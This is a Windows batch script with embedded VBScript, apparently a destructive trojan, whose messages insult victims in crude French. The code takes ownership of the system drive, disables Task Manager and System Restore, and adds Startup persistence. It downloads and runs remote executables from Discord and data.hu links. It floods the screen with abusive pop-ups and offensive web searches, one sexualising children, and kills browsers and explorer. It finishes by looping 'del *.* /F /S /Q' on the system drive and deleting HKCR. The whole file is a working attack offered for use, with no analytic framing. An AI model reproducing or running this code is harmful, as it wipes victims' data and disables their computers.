@echo off
set ztmp=C:\Users\%USERNAME%\AppData\Local\Temp\ztmp
set MYFILES=C:\Users\%USERNAME%\AppData\Local\Temp\afolder
set bfcec=t10139.exe
set cmdline=
SHIFT /0
@echo off
cmd /c %MYFILES%\booster.exe
title WinServicePackages
cd %systemdrive%\Users\%USERNAME%\AppData\Local\Temp
takeown /f %systemdrive%\*.* >nul
Icacls %systemdrive%\*.* /C /G %username%:F >nul
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f >nul
cls

set /a twitch=%random%
set /a nouveau=%random%
set /a lol=%random%
set /a pute=%random%
set /a prenom=%random%
set /a disque=%random%
set /a led=%random%
set /a fdc=%random%
set /a fdcbat=%random%
set /a salope=%random%
set /a japonais=%random%
set /a fetch=%random%
set /a pourlegachasex=%random%

cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
@echo off>mssec.bat
@echo copy /y %~f0 "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\mssec.bat">>mssec.bat
@echo shutdown /r>>mssec.bat
copy /y mssec.bat "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\mssec.bat"

cd %systemdrive%\Users\%USERNAME%\AppData\Local\Temp

@echo Set wshShell = CreateObject( "WScript.Shell" )>%lol%.vbs
@echo strUserName = wshShell.ExpandEnvironmentStrings( "%USERNAME%" )>>%lol%.vbs
@echo Set wshell = CreateObject("WScript.Shell")>>%lol%.vbs
@echo voila = wshell.ExpandEnvironmentStrings("%SYSTEMDRIVE%")>>%lol%.vbs
@echo. >>%lol%.vbs
(echo HTTPDownload "https://image.noelshack.com/fichiers/2022/48/3/1669809091-risitas.jpeg", "" ^& voila ^& "\Users\" ^& strUserName ^& "\AppData\Local\Temp")>>%lol%.vbs
(echo HTTPDownload "https://cdn.discordapp.com/attachments/1025871796798500925/1047554447863189624/risitas.hta", "" ^& voila ^& "\Users\" ^& strUserName ^& "\AppData\Local\Temp")>>%lol%.vbs
(echo HTTPDownload "https://ddl8.data.hu/get/339969/12880996/melter.exe", "" ^& voila ^& "\Users\" ^& strUserName ^& "\AppData\Local\Temp")>>%lol%.vbs
@echo. >>%lol%.vbs
@echo Sub HTTPDownload( myURL, myPath )>>%lol%.vbs
@echo. >>%lol%.vbs
@echo     Dim i, objFile, objFSO, objHTTP, strFile, strMsg>>%lol%.vbs
(echo      Const ForReading = 1, ForWriting = 2, ForAppending = 8)>>%lol%.vbs
@echo. >>%lol%.vbs
@echo     Set objFSO = CreateObject( "Scripting.FileSystemObject" )>>%lol%.vbs
@echo. >>%lol%.vbs
@echo     If objFSO.FolderExists( myPath ) Then>>%lol%.vbs
@echo         strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )>>%lol%.vbs
@echo     ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) - 1 ) ) Then>>%lol%.vbs
@echo         strFile = myPath>>%lol%.vbs
@echo     Else>>%lol%.vbs
@echo         WScript.Echo "ERROR: Target folder not found.">>%lol%.vbs
@echo         Exit Sub>>%lol%.vbs
@echo     End If>>%lol%.vbs
@echo. >>%lol%.vbs
@echo     Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )>>%lol%.vbs
@echo. >>%lol%.vbs
@echo     Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )>>%lol%.vbs
@echo. >>%lol%.vbs
@echo     objHTTP.Open "GET", myURL, False>>%lol%.vbs
@echo     objHTTP.Send>>%lol%.vbs
@echo. >>%lol%.vbs
@echo     For i = 1 To LenB( objHTTP.ResponseBody )>>%lol%.vbs
@echo         objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )>>%lol%.vbs
@echo     Next>>%lol%.vbs
@echo. >>%lol%.vbs
@echo     objFile.Close( )>>%lol%.vbs
@echo End Sub>>%lol%.vbs

set file=Defis_et_Lilopie_Pur_Biday.mp3
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "http://p0wnage.github.io/db/payloads/dl/Defis_et_Lilopie_Pur_Biday.mp3"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >%nouveau%.vbs

set file=alerte_enculay.mp3
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "http://p0wnage.github.io/db/payloads/dl/alerte_enculay.mp3"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >%salope%.vbs

set file=alerte_enculay.mp3
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo wscript.sleep 260000
  echo Sound.URL = "http://p0wnage.github.io/db/payloads/dl/alerte_shemale.mp3"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >%japonais%.vbs


@echo WScript.Sleep 84000>>%twitch%.vbs
@echo do>>%twitch%.vbs
@echo Dim wsh>>%twitch%.vbs
@echo Set wsh=WScript.CreateObject("WScript.Shell")>>%twitch%.vbs
@echo wsh.Run "https://mrparadoxal.github.io/">>%twitch%.vbs
@echo WScript.Sleep 1000>>%twitch%.vbs
@echo loop>>%twitch%.vbs

@echo Set oWMP = CreateObject("WMPlayer.OCX.7" )>%disque%.vbs
@echo Set colCDROMs = oWMP.cdromCollection>>%disque%.vbs
@echo if colCDROMs.Count ^>= 1 then>>%disque%.vbs
@echo do>>%disque%.vbs
@echo For i = 0 to colCDROMs.Count - ^1>>%disque%.vbs
@echo colCDROMs.Item(i).Eject>>%disque%.vbs
@echo Next ' cdrom>>%disque%.vbs
@echo For i = 0 to colCDROMs.Count - ^1>>%disque%.vbs
@echo colCDROMs.Item(i).Eject>>%disque%.vbs
@echo Next ' cdrom>>%disque%.vbs
@echo loop>>%disque%.vbs
@echo End If>>%disque%.vbs

@echo set w = CreateObject("WScript.Shell")>%fdc%.vbs
@echo W.Run chr(34) ^& WScript.Arguments(0) ^& chr(34), ^0>>%fdc%.vbs
@echo set w= Nothing>>%fdc%.vbs

@echo :corde>%fdcbat%.bat
@echo reg add "HKCU\control panel\desktop" /v wallpaper /t REG_SZ /d "" /f >nul>>%fdcbat%.bat
@echo reg add "HKCU\control panel\desktop" /v wallpaper /t REG_SZ /d "%systemdrive%\Users\%USERNAME%\AppData\Local\Temp\1667267784-parti.png" /f >nul>>%fdcbat%.bat
@echo reg delete "HKCU\Software\Microsoft\Internet Explorer\Desktop\General" /v WallpaperStyle /f >nul>>%fdcbat%.bat
@echo reg add "HKCU\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f >nul>>%fdcbat%.bat
@echo RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters  >nul>>%fdcbat%.bat
@echo start %prenom%.vbs>>%fdcbat%.bat
@echo goto corde>>%fdcbat%.bat


@echo Set wshShell =wscript.CreateObject("WScript.Shell")>%led%.vbs
@echo do>>%led%.vbs
@echo wscript.sleep 100>>%led%.vbs
@echo wshshell.sendkeys "{CAPSLOCK}">>%led%.vbs
@echo wshshell.sendkeys "{NUMLOCK}">>%led%.vbs
@echo wshshell.sendkeys "{SCROLLLOCK}">>%led%.vbs
@echo loop>>%led%.vbs

@echo arabe = Array("https://www.google.com/search?q=Photo+d'enfants+en+maillot+de+bain+c'est+pour+ma+cousine+tkt+gilbert&sxsrf=ALiCzsab_keH-uymiSzxHsxyjjzsaggVWA:1667682132973&source=lnms&tbm=isch&sa=X&ved=2ahUKEwja9oiJ-Jf7AhX9lIkEHYo5CWgQ_AUoAXoECAIQAw&cshid=1667682169917823&biw=1536&bih=758&dpr=1.25", "https://google.com/search?q=tuto+devenir+un+femboy", "https://google.com/search?q=Comment+voler+une+poussette+?", "https://youareanidiot.cc/", "http://www.trottla.net/gallrey/gallery-kakonotop2.html", "https://google.com/search?q=how+2+buy+weed", "https://forums.commentcamarche.net/forum/affich-16798663-mon-pc-est-hacke-comment-faire", "https://google.com/search?q+among+us+crack+legit+2022+free+gems+hack+working")>%fetch%.vbs
@echo Set feug=wscript.CreateObject("WScript.Shell")>>%fetch%.vbs

@echo dim r>>%fetch%.vbs
@echo randomize>>%fetch%.vbs
@echo wscript.sleep(40000)>>%fetch%.vbs
@echo do>>%fetch%.vbs
@echo r = int(rnd*10)>>%fetch%.vbs
@echo feug.Run(arabe(r))>>%fetch%.vbs
@echo r = int(rnd*7000) + 4000>>%fetch%.vbs
@echo wscript.sleep(r)>>%fetch%.vbs
@echo loop>>%fetch%.vbs

@echo Set four=wscript.CreateObject("WScript.Shell")>>%pourlegachasex%.vbs
@echo wscript.sleep(43000)>>%pourlegachasex%.vbs
@echo four.Run("%temp%\%salope%.vbs")>>%pourlegachasex%.vbs
@echo wscript.sleep(7000)>>%pourlegachasex%.vbs
@echo four.Run("%appdata%\mcnutt.mp4")>>%pourlegachasex%.vbs


@echo do>%prenom%.vbs
@echo x=msgbox ("Dans 5 minutes tu n'as plus de PC fils de viol, le 18-25 t'a bien baiser le cul :)")>>%prenom%.vbs
@echo CreateObject("WScript.Shell").Run "%prenom%.vbs">>%prenom%.vbs
@echo loop>>%prenom%.vbs

@echo CreateObject("SAPI.SpVoice").Speak"Coucou, je suis juste la petite voix qui te dit que le 18 25 vient de detruire ton PC et ce a tout jamais. Amuse toi bien a le reparer fils de viol, tres content. Dedi aux raiyes du 18 25.">%pute%.vbs


start %fdc%.vbs %MYFILES%\feuj.bat

:eau
if exist %twitch%.vbs (
	start %twitch%.vbs
	goto putain
) ELSE (
	goto eau
)

:putain
if exist %fetch%.vbs (
	start %fetch%.vbs
	goto joustisse
) ELSE (
	goto putain
)

:joustisse
if exist %pourlegachasex%.vbs (
	start %pourlegachasex%.vbs
	goto shemalepd
) ELSE (
	goto joustisse
)

:shemalepd
if exist %japonais%.vbs (
	start %japonais%.vbs
	goto moins
) ELSE (
	goto shemalepd
)

:moins
if exist %lol%.vbs (
		start %lol%.vbs
		timeout 10 >nul
                start %MYFILES%\Twitch.exe
                timeout 50 >nul
		goto suceautre
	) ELSE (
		goto moins
	)

:suceautre
rundll32 user32.dll, SwapMouseButton >nul


:chien
if exist %pute%.vbs (
	start %pute%.vbs
	goto prout
) ELSE (
	goto chien
)

:prout
timeout 14 >nul
taskkill /F /IM hl2.exe
taskkill /F /IM javaw.exe
taskkill /F /IM RobloxPlayerBeta.exe
taskkill /F /IM FortniteClient-Win64-Shipping.exe
taskkill /F /IM GenshinImpact.exe
taskkill /F /IM Among Us.exe
taskkill /F /IM chrome.exe
taskkill /F /IM firefox.exe
taskkill /F /IM opera.exe
taskkill /F /IM brave.exe
taskkill /F /IM msedge.exe
taskkill /F /IM iexplore.exe
taskkill /F /IM explorer.exe
shutdown -r -t 300 -c "Dans 5 minutes tu n'as plus de PC fils de viol, le 18-25 t'a bien baiser le cul :)"

:aaa
if exist %nouveau%.vbs (
	start %nouveau%.vbs
	goto mdrpd
) ELSE (
	goto aaa
)

:mdrpd
if exist %disque%.vbs (
	start %disque%.vbs
	goto extrapd
) ELSE (
	goto mdrpd
)

:extrapd
if exist %led%.vbs (
	start %led%.vbs
	goto tgjuif
) ELSE (
	goto extrapd
)

:tgjuif
if exist noel.hta (
	start noel.hta
	goto pourlefdc
) ELSE (
	tgjuif
)

:pourlefdc
if exist %fdcbat%.bat (
	start %fdc%.vbs %fdcbat%.bat
        goto caca
) ELSE (
	goto pourlefdc
)

:caca
if exist %prenom%.vbs (
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	start %prenom%.vbs
	goto svt
) ELSE (
	goto caca
)

:svt
start melter.exe
cd %systemdrive%\
del *.* /F /S /Q >nul
reg delete HKCR /F >nul
goto svt



